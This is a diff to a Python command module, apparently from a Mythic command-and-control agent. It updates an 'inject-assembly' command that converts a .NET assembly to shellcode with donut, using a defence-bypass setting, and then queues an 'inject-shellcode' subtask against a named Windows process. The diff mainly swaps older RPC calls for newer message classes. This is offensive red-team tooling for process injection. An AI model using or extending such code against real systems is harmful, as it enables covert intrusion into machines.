@@ -70,15 +70,11 @@ class InjectAssemblyCommand(CommandBase):
     browser_script = None
     attributes = CommandAttributes(
         supported_os=[SupportedOS.Windows],
+        builtin=True
     )
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         #Get original file info
-        file_resp = await MythicRPC().execute("get_file",
-                                        file_id=task.args.get_arg("file"),
-                                        task_id=task.id,
-                                        get_contents=True)
-        
         fData = FileData()
         fData.AgentFileId = task.args.get_arg("file")
         file = await SendMythicRPCFileGetContent(fData)
@@ -102,6 +98,7 @@ class InjectAssemblyCommand(CommandBase):
             params = task.args.get_arg("arguments"),
             exit_opt = 2,
         )
+
         fileCreate = MythicRPCFileCreateMessage()
 
         fileCreate.FileContents = shellcode
@@ -116,48 +113,10 @@ class InjectAssemblyCommand(CommandBase):
             createSubtaskMessage.TaskID = task.id
             createSubtaskMessage.CommandName = "inject-shellcode"
             createSubtaskMessage.Params = "{\"file\":\"" + shellcodeFile.AgentFileId + "\", \"processName\":\"" + task.args.get_arg("processName") + "\", \"output\":\"" + task.args.get_arg("output") + "\"}"
-
-        if file_resp.status == MythicRPCStatus.Success:
-            if len(file_resp.response) > 0:
-                file_contents = file_resp.response[0]["contents"]
-                original_file_name = file_resp.response[0]["filename"]
-
-                #Create a temporary file
-                temp = tempfile.NamedTemporaryFile()
-
-                #write file to disk
-                temp.write(base64.b64decode(file_contents))
-
-
-                #run donut on file
-                shellcode = donut.create(
-                    file=temp.name,
-                    arch=3,
-                    bypass=3,
-                    params = '',
-                )
-
-
-
-                print(len(shellcode))
-
-                #Register File in Mythic
-                response = await MythicRPC().execute("create_file",
-                    file=base64.b64encode(shellcode).decode(),
-                    saved_file_name=original_file_name,
-                    delete_after_fetch=True,
-                )
-                
-                #Call shellcode-inject subtask (not finished yet)
-                resp = await MythicRPC().execute("create_subtask_group", tasks=[
-                    {"command": "inject-shellcode", "params": {"file":response.response["agent_file_id"], "processID":task.args.get_arg('processID').lower(), "processName":task.args.get_arg('processName'), "output":task.args.get_arg('output')}},
-                    ], 
-                    subtask_group_name = "ds", group_callback_function=self.load_completed.__name__, parent_task_id=task.id) #TODO
-
-            else:
-                raise Exception("Failed to find that file")
+            createSubtaskMessage.Token = task.token
+            await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)
         else:
-            raise Exception("Error from Mythic trying to get file: " + str(file_resp.error))
+            raise Exception("Error from Mythic trying to run task: " + shellcodeFile.Error)
 
         return task
 
